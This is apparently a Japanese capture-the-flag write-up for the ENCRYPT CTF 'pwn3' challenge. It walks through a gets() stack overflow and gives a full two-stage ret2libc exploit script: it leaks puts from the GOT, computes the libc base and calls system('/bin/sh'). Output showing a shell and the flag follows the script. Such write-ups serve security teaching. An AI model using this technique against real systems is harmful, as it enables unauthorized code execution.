# [pwn 300pts] pwn3 - ENCRYPT CTF
ENCRYPT CTFの300点問題なので期待しましょう。
32bitバイナリでセキュリティ機構は基本的に無効のようです。
```
$ checksec pwn3
[*] 'pwn3'
    Arch:	32 bits (little endian)
    NX:		NX enabled
    SSP:	SSP disabled (No canary found)
    RELRO:	No RELRO
    PIE:	PIE disabled
```
まずはIDAで解析します。
今までと同じくgetsによるスタックオーバーフローです。
今回は今までと違って補助的な関数はありません。

したがって、putsでlibcのバージョン特定&アドレスリークをし、`system("/bin/sh")`を呼びましょう。
面倒なのでlibcバージョンを調べる過程は省略します。

```python
from ptrlib import *

libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
elf = ELF("./pwn3")
sock = Process("./pwn3")

plt_puts = 0x08048340

# Stage 1
payload = b'A' * 0x8C
payload += p32(plt_puts)
payload += p32(elf.symbol("_start"))
payload += p32(elf.got("puts"))
sock.recvuntil("desert: \n")
sock.sendline(payload)
addr_puts = u32(sock.recvline()[:4])
libc_base = addr_puts - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_exit = libc_base + libc.symbol("exit")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

# Stage 2
payload = b'A' * 0x8c
payload += p32(addr_system)
payload += p32(addr_exit)
payload += p32(addr_binsh)
sock.sendline(payload)

sock.interactive()
```

できました。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=9389)
[ptrlib] libc base = 0xf7d99000
[ptrlib]$ cat flag.txt
I am hungry you have to feed me to win this challenge...

Now give me some sweet desert: 
encryptCTF{70_7h3_C3nt3R_0f_L!bC}
[ptrlib]$
```

# 感想
スタックオーバーフローに慣れていればさくっと解ける問題だと思います。